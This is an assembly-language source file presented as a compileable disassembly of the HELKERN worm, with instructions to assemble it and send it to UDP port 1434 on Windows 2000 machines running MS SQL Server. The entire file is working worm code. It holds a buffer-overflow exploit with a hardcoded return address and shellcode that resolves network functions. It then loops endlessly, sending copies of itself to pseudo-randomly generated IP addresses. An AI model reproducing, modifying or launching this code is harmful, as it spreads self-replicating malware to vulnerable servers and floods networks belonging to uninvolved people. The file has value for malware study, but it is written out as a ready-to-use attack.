
; HELKERN worm compileable disassembly
; =============================================================================
; compile: nasm -f bin helkern.asm
; run:     send to 1434/udp, win2000 / ms sql server

%macro          onstack  2
%assign         _cur_stk_size  (_cur_stk_size + %2)
%1              equ      _cur_stk_size
%endmacro

                BITS    32

worm_start:

                db      04h          ; will be reconstructed
                times   88 db 01h    ;
                dd      42B0C9DCh    ;

; constant code start

                jmp     short $+16   ; 8 bytes
                times   6 db 01h     ;

                dd      42AE7001h
                dd      42AE7001h

                nop
                nop
                nop
                nop

                nop
                nop
                nop
                nop

                push    dword 42B0C9DCh       ; [RET] sqlsort.dll -> jmp esp

; Reconstruct session, after the overflow the payload buffer
; get's corrupted during program execution but before the
; payload is executed.

                mov     eax, 01010101h
                xor     ecx, ecx
                mov     cl, 18h
                push    eax
                loop    $-1

                xor     eax, 05010101h
                push    eax

; lets go

                mov     ebp, esp

%define         _cur_stk_size   0

                push    ecx
                push    dword '.dll'
                push    dword 'el32'
                push    dword 'kern'         ; kernel32

onstack         _kernel32_dll, 16

                push    ecx
                push    dword 'ount'         ; GetTickCount
                push    dword 'ickC'
                push    dword 'GetT'

onstack         _gettickcount, 16

                mov     cx, 'll'
                push    ecx
                push    dword '32.d'         ; ws2_32.dll
                push    dword 'ws2_'

onstack         _ws2_32_dll, 12

                mov     cx, 'et'
                push    ecx
                push    dword 'sock'         ; socket

onstack         _socket, 8

                mov     cx, 'to'
                push    ecx
                push    dword 'send'         ; sendto

onstack         _sendto, 8

                mov     esi, 42AE1018h       ; IAT from sqlsort

                lea     eax, [ebp - _ws2_32_dll]  ; ws2_32.dll
                push    eax
                call    dword [esi]          ; call LoadLibraryA

                push    eax                  ; HINSTANCE ws2_32.dll

onstack         _ws2_32_base, 4

                lea     eax, [ebp - _gettickcount]
                push    eax                  ; ptr to GetTickCount (PUSH for GetProcAddress)

                lea     eax, [ebp - _kernel32_dll]  ; kernel32.dll
                push    eax
                call    dword [esi]          ; call LoadLibraryA

                push    eax                  ; HINSTANCE kernel32.dll (PUSH for GetProcAddress)

; Check entry point fingerprint for getprocaddress, if it failes
; fall back to GetProcAddress entry in another DLL version.
; Undetermined what dll versions this will succedd on. Due
; to the lack of reliable importing this may not work across all
; dll versions.

                mov     esi, 42AE1010h       ; IAT from sqlsort
                mov     ebx, [esi]
                mov     eax, [ebx]
                cmp     eax, 51EC8B55h  ; check entry point fingerprint
                jz      short VALID_GP
                mov     esi, 42AE101Ch  ; IAT entry -> 77EA094C
VALID_GP:
                call    dword [esi]     ; GetProcAddress

                call    eax             ; call GetTickCount

                xor     ecx, ecx
                push    ecx             ; 8 unused bytes of sockaddr_in
                push    ecx             ;

onstack         _sockaddr_unused, 8

                push    eax             ; sockaddr_in.sin_addr

onstack         _random_ip, 4

                xor     ecx, 9B040103h
                xor     ecx, 01010101h

                push    ecx             ; 9A050002 = port 1434 / AF_INET

onstack         _sockaddr_proto_and_port, 4

_sockaddr       equ     _cur_stk_size

                lea     eax, [ebp - _socket]  ; (socket)
                push    eax
                mov     eax, [ebp - _ws2_32_base]  ; ws2_32 base address
                push    eax
                call    dword [esi]     ; GetProcAddress

                push    byte 11h        ; IPPROTO_UDP
                push    byte 2          ; SOCK_DGRAM
                push    byte 2          ; AF_INET
                call    eax             ; call socket()

                push    eax             ; socket #

onstack         _socket_handle, 4

                lea     eax, [ebp - _sendto]  ; sendto
                push    eax
                mov     eax, [ebp - _ws2_32_base]  ; ws2_32 base address
                push    eax
                call    dword [esi]     ; GetProcAddress

                mov     esi, eax        ; save sendto -> esi

                or      ebx, ebx
                xor     ebx, 0FFD9613Ch

PRND:
                mov     eax, [ebp - _random_ip]  ; Pseudo Random Algorithm Start
                ;;
                lea     ecx, [eax+eax*2]
                lea     edx, [eax+ecx*4]
                shl     edx, 4
                add     edx, eax
                shl     edx, 8
                sub     edx, eax
                lea     eax, [eax+edx*4]
                add     eax, ebx        ; Pseudo Random Algorithm End
                ;;
                mov     [ebp - _random_ip], eax  ; just generated random ip

                push    byte 16         ; sizeof(sockaddr) = 16
                lea     eax, [ebp - _sockaddr]  ; sockaddr to
                push    eax
                xor     ecx, ecx        ; int flags = 0
                push    ecx
                xor     cx, worm_size + 8   ; int len = 376
                push    ecx
                lea     eax, [ebp + 3]    ; BYTE* buf
                push    eax
                mov     eax, [ebp - _socket_handle]  ; SOCKET socket
                push    eax
                call    esi             ; sendto

                jmp     short PRND      ; Jump back to Pseudo Random Algorithm Start

worm_size       equ     $-worm_start

; [EOF]
